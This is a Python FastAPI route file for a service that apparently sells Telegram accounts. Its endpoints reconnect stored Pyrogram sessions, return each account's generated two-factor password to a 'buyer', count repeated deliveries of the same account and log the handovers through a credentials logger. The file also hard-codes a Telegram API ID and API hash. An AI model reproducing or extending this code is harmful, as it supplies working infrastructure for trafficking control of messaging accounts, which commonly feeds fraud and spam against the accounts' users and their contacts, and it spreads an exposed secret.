"""
Delivery API Routes
Handles: request delivery code, confirm delivery
"""

import asyncio
from datetime import datetime, timedelta
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from backend.core_engine.logger import get_logger
from backend.core_engine.pyrogram_client import get_session_manager
from backend.core_engine.credentials_logger import log_credentials
from backend.models.database import (
    DeliveryStatus, get_account, update_account, log_auth_action
)

logger = get_logger("DeliveryAPI")
router = APIRouter(tags=["Delivery"])

API_ID = 28907635
API_HASH = "fa6c3335de68283781976ae20f813f73"


class DeliveryConfirmRequest(BaseModel):
    received: bool = True


def get_pyrogram():
    return get_session_manager(API_ID, API_HASH, "sessions")


@router.post("/delivery/request-code/{account_id}")
async def request_delivery_code(account_id: str):
    """Request login code for delivery to buyer"""
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    if not account.pyrogram_session:
        raise HTTPException(status_code=400, detail="No session available")
    
    manager = get_pyrogram()
    
    connected = await manager.connect_from_string(phone, account.pyrogram_session)
    if not connected:
        raise HTTPException(status_code=400, detail="Failed to connect session")
    
    await update_account(
        phone,
        delivery_status=DeliveryStatus.CODE_SENT,
        code_sent_at=datetime.utcnow(),
        confirmation_deadline=datetime.utcnow() + timedelta(minutes=5)
    )
    
    return {
        "status": "success",
        "message": "Delivery code sent",
        "account_id": phone,
        "two_fa_password": account.generated_password,
        "fallback_seconds": 20
    }


@router.post("/delivery/confirm/{account_id}")
async def confirm_delivery(account_id: str, request: DeliveryConfirmRequest):
    """Confirm delivery received by buyer"""
    phone = account_id
    account = await get_account(phone)
    
    if not account:
        raise HTTPException(status_code=404, detail="Account not found")
    
    if not request.received:
        return {"status": "cancelled", "message": "Delivery cancelled"}
    
    manager = get_pyrogram()
    
    try:
        await manager.disconnect(phone)
    except:
        pass
    
    new_count = (account.delivery_count or 0) + 1
    
    await update_account(
        phone,
        delivery_status=DeliveryStatus.BUYER_DELIVERED,
        delivered_at=datetime.utcnow(),
        delivery_count=new_count,
        pyrogram_session=None,
        telethon_session=None
    )
    
    log_credentials(
        phone=phone,
        action="DELIVERY_CONFIRMED",
        telegram_id=account.telegram_id,
        extra_data={"delivery_number": new_count}
    )
    
    await log_auth_action(phone, "delivery_confirm", "success", f"Delivery #{new_count}")
    
    return {
        "status": "success",
        "message": f"Delivery #{new_count} confirmed",
        "account_id": phone,
        "delivery_number": new_count
    }
